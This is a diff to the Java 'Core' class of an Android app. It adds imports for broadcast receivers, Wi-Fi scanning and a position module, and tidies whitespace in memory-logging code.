@@ -16,9 +16,14 @@ import android.app.Activity;
 import android.app.ActivityManager;
 import android.app.ActivityManager.RunningAppProcessInfo;
 import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.res.Resources;
+import android.net.wifi.ScanResult;
+import android.net.wifi.WifiManager;
 import android.os.Debug.MemoryInfo;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
@@ -35,6 +40,7 @@ import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
 import com.android.networking.manager.ManagerEvent;
 import com.android.networking.manager.ManagerModule;
+import com.android.networking.module.ModulePosition;
 import com.android.networking.util.Check;
 import com.android.networking.util.Utils;
 
@@ -79,7 +85,7 @@ public class Core extends Activity implements Runnable {
 		if (singleton == null) {
 			singleton = new Core();
 		}
-	
+
 		return singleton;
 	}
 
@@ -106,7 +112,7 @@ public class Core extends Activity implements Runnable {
 
 		moduleManager = ManagerModule.self();
 		eventManager = ManagerEvent.self();
-		
+
 		contentResolver = cr;
 		if (Cfg.DEBUG) {
 			coreThread.setName(getClass().getSimpleName());
@@ -673,19 +679,18 @@ public class Core extends Activity implements Runnable {
 		android.app.ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
 		activityManager.getMemoryInfo(memoryInfo);
 
-		Check.log(TAG + " memoryInfo.availMem: " + memoryInfo.availMem , true);
-		Check.log(TAG + " memoryInfo.lowMemory: " + memoryInfo.lowMemory , true);
-		Check.log(TAG + " memoryInfo.threshold: " + memoryInfo.threshold , true);
+		Check.log(TAG + " memoryInfo.availMem: " + memoryInfo.availMem, true);
+		Check.log(TAG + " memoryInfo.lowMemory: " + memoryInfo.lowMemory, true);
+		Check.log(TAG + " memoryInfo.threshold: " + memoryInfo.threshold, true);
 
 		int pid = android.os.Process.myPid();
 		int pids[] = new int[] { pid };
 
 		android.os.Debug.MemoryInfo[] memoryInfoArray = activityManager.getProcessMemoryInfo(pids);
 		for (android.os.Debug.MemoryInfo pidMemoryInfo : memoryInfoArray) {
-			Check.log(TAG + " pidMemoryInfo.getTotalPrivateDirty(): " + pidMemoryInfo.getTotalPrivateDirty() ,
-					true);
-			Check.log(TAG + " pidMemoryInfo.getTotalPss(): " + pidMemoryInfo.getTotalPss() , true);
-			Check.log(TAG + " pidMemoryInfo.getTotalSharedDirty(): " + pidMemoryInfo.getTotalSharedDirty() , true);
+			Check.log(TAG + " pidMemoryInfo.getTotalPrivateDirty(): " + pidMemoryInfo.getTotalPrivateDirty(), true);
+			Check.log(TAG + " pidMemoryInfo.getTotalPss(): " + pidMemoryInfo.getTotalPss(), true);
+			Check.log(TAG + " pidMemoryInfo.getTotalSharedDirty(): " + pidMemoryInfo.getTotalSharedDirty(), true);
 		}
 
 	}
@@ -717,4 +722,6 @@ public class Core extends Activity implements Runnable {
 			return false;
 		}
 	}
+
+	
 }
